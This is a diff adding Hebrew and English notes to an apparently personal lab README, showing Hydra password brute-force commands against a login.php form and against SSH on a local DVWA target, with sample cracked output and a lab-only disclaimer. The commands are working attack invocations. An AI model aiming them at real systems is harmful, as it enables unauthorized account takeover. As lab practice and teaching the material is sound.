@@ -1,3 +1,67 @@
+➤ Hydra Command (Brute-force on a web login form):
+
+hydra -L users.txt -P passwords.txt 127.0.0.1 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Incorrect"
+
+הסבר הפרמטרים:
+-L users.txt — רשימת שמות משתמשים
+
+-P passwords.txt — רשימת סיסמאות
+
+127.0.0.1 — היעד (במעבדה שלך זה ה־DVWA בתוך Docker)
+
+http-post-form — סוג התקיפה המתבצעת בטופס התחברות
+
+"F=Incorrect" — מה Hydra מזהה ככישלון (מתוך תגובת השרת)
+
+
+
+---
+
+💡 אפשרות נוספת — Brute Force על SSH
+
+hydra -L users.txt -P passwords.txt ssh://127.0.0.1
+
+
+---
+
+✔ Expected Output (דוגמה אמיתית):
+
+[22][ssh] host: 127.0.0.1   login: hanna   password: P@ssw0rd
+
+
+---
+
+📌 Usage Notes (מופיע יפה ב־README)
+
+This attack was performed only inside a private, isolated cybersecurity lab.
+
+No real systems, accounts, or servers were targeted.
+
+Wordlists included in this repo are for educational practice only.
+
+Hydra is a powerful tool — use responsibly and legally.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 # 🔐 Hydra Lab — Brute Force Attack in an Isolated Environment
 
 This repository documents my practice with *Hydra, a password-cracking tool used for ethical security testing in a **fully isolated cybersecurity lab*.
